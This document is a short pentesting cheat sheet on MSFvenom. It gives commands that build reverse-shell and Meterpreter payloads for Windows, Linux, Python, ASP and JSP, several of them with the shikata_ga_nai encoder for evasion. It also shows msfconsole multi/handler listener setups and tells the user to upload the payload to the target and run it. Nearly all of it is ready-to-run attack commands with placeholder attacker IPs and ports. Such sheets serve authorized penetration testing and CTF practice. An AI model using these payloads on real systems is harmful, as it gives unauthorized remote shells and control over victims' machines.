# MSFvenom

## Generate Shellcode

Create Executable to drop on Windows target

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f exe > wince.exe
```

Upload wince.exe to the Windows target

Start netcat listener

Execute `wince.exe` from the Windows target

## Encoder

### Windows

Create Meterpreter shell executable

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f exe > winmet.exe
```

Upload winmet.exe to the Windows target

Set up a Meterpreter Listener

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
exploit
```

Execute winmet.exe from the Windows target

### Linux

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f elf > linmet
```

## Custom

### Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > cmdpy.sh
```

Upload to target

Start netcat listener

Execute from target

### Python Meterpreter

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw cmd.py
```

Upload to target

Set up a Meterpreter Listener

```bash
msfconsole
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
exploit
```

Execute from target

## ASP

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f asp > cmd.asp
```

## JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f raw > cmd.jsp
```

## Resources

### Payloads

{% embed url="https://hannahsuarez.github.io/2017/msfvenom-payloads" %}

##